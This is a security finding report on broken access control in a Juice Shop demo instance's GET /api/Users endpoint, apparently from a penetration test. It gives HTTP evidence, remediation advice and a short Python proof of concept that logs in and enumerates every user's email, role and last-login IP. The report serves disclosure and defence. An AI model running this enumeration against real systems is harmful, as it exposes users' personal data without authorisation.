# Broken access control: any customer can list all users' emails, roles and last-login IPs (GET /api/Users)

**ID:** vuln-0007
**Severity:** MEDIUM
**Found:** 2026-09-11 19:57:09 UTC
**Target:** http://host.docker.internal:3001
**Endpoint:** /api/Users
**Method:** GET
**CWE:** CWE-862
**CVSS:** 4.3
**Confidence:** High
**Fix Effort:** Low

## Description

Any authenticated customer can retrieve the complete user directory: `GET /api/Users` returns every registered account's email, role, last-login IP, profile image and activity flags, and `GET /api/Users/:id` exposes any individual record. The endpoint requires authentication but performs no role check — a plain customer receives the admin account's record alongside all other users'.

## Evidence

Attacker A is a plain customer (id 25):

```json
GET /api/Users
Authorization: Bearer <A's customer JWT>

200 OK — 28 records, including:
{"id":1,"email":"admin@juice-sh.op","role":"admin","lastLoginIp":"",...}
{"id":2,"email":"jim@juice-sh.op","role":"customer",...}
{"id":27,"email":"idor.b.jcgpw4pc@juice-sh.op",...}
```

`GET /api/Users/1` and `GET /api/Users/2` as A: 200 with full records. Controls: `GET /api/Users` unauthenticated → 401; `PUT /api/Users/27` as A → 401. Cross-verified with the second test identity (user B) — same full-directory response.

## Impact

Any customer obtains a complete mailing list of all users including the administrator's account identity (email + role), plus per-user last-login IP addresses — reconnaissance material for credential attacks, phishing, and targeted privilege-escalation attempts against the admin account. Enumeration of valid emails also feeds the password-reset and security-question flows.

## Counterevidence

Checked for compensating controls: the record list excludes password hashes and totpSecrets, so the most sensitive fields are filtered. Checked write access: PUT /api/Users/27 as A returns 401 — record modification is properly guarded, and this finding is disclosure-only. Checked unauthenticated access: 401 without a token, so this is not a fully public endpoint. No row-level filtering by caller was found on the read path.

## What Would Change This Severity

If the records also leaked password hashes or 2FA secrets (they currently do not), or if this listing enabled a demonstrated account takeover via the reset flow, severity would rise to High.

## Technical Analysis

The `/api/Users` Sequelize REST read endpoints sit behind authentication middleware but have no authorization constraint: any valid JWT, regardless of its `role` claim, receives the full model listing. Per-object reads accept arbitrary IDs with no caller binding. The response is filtered to non-secret fields (no password hashes), but emails, roles and last-login IPs of all users — including the admin — are returned to the lowest privilege level.

## Proof of Concept

1. Register a fresh account and log in to obtain a plain-customer JWT. 2. Send `GET /api/Users` with that JWT. 3. Observe a 200 response listing all 28 user records with emails and roles, including the admin account. 4. Send `GET /api/Users/1` to fetch the admin record individually. 5. Confirm the endpoint is not simply public: the same request without a token returns 401.

```python
import requests

BASE = "http://host.docker.internal:3001"
tok = requests.post(BASE + "/rest/user/login", json={
    "email": "tester.recon@juice-sh.op", "password": "recon123456"
}).json()["authentication"]["token"]
H = {"Authorization": "Bearer " + tok}

r = requests.get(BASE + "/api/Users", headers=H)
users = r.json()["data"]
print("records visible to a plain customer:", len(users))          # -> 28
print("admin record:", [u for u in users if u["role"] == "admin"])  # -> admin@juice-sh.op exposed
print("individual fetch:", requests.get(BASE + "/api/Users/1", headers=H).json()["data"]["email"])
print("unauth:", requests.get(BASE + "/api/Users").status_code)     # -> 401
```

## Remediation

Restrict user-record reads to privileged roles: require an admin role claim in the JWT on `GET /api/Users` and `GET /api/Users/:id`, and return 403 for other roles. If customers legitimately need their own record, expose only `GET /api/Users/<own id>` resolved from the token, never a directory listing.

## Assumptions

Assumes the attacker holds any valid customer JWT (free self-registration). Demo instance; a production deployment would expose genuine customer emails.
